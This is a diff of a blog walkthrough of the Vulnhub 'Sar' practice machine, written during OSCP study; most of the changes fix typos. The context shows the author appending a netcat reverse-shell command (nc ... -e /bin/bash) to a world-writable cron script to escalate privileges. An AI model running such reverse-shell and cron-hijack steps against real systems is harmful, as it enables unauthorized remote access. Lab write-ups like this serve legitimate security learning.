@@ -5,11 +5,11 @@ title: Vulnhub:Sar
 
 ### Introduction
 
-Vulnhub is awesome.  I'm not here to tell you about it, so go find about for yourself: [Vulnhub](https://www.vulnhub.com/resources/).  Today's box on my OSCP journey is [Sar](https://www.vulnhub.com/entry/sar-1,425/).
+Vulnhub is awesome.  I'm not here to tell you about it, so go find out for yourself: [Vulnhub](https://www.vulnhub.com/resources/).  Today's box on my OSCP journey is [Sar](https://www.vulnhub.com/entry/sar-1,425/).
 
 ### Disclaimer
 
-A quick disclaimer here: these aren't going to be "here's how I got root".  The best part about the OSCP journey has been the persepctive I've gained looking at systems and thinking through them coming from a blue team background.  I liek to write these to help explain how I thought through the box, where I needed help, and what I learned.
+A quick disclaimer here: these aren't going to be "here's how I got root".  The best part about the OSCP journey has been the persepctive I've gained looking at systems and thinking through them, especially coming from a blue team background.  I like to write these to help explain how I thought through the box, where I needed help, and what I learned.
 
 ## Enumeration
 
@@ -220,6 +220,7 @@ drwxr-xr-x 4 www-data www-data  4096 Jan  4 10:13 sar2HTML
 
 Well, anyone can write to "write.sh" so there's out ticket.  But what to write?  Netcat?  Open that shell.sh we used inside of the "sar2HTML" directory? I checked netcat and sure enough it's installed.  This will be easy!  We'll just have netcat execute another bash shell back to us:
 >$ echo "nc 10.10.10.11 9999 -e /bin/bash" >> write.sh
+
 I open a listener on 9999 and go make a cup of tea.  Black tea.  No sugar, no cream.  Just good hot tea.  I check my listener... nothing.  Has 5 minutes passed?  I glance at the cron job and it's every 5 minutes... so 12:00, 12:05... it's definitely been 5 minutes.  Nothing.  I double check the above commands, looking for typos but it all looks good.  Another 5 minutes... nothing.  Dang it!  Let's run the command outside of "Write.sh" just to triple check.  Awww man, the version of netcat doesn't support "-e" or maybe the port is in use?  I try another port, nothing.
 
 I'm so close... well, php worked before, so let's use it again.
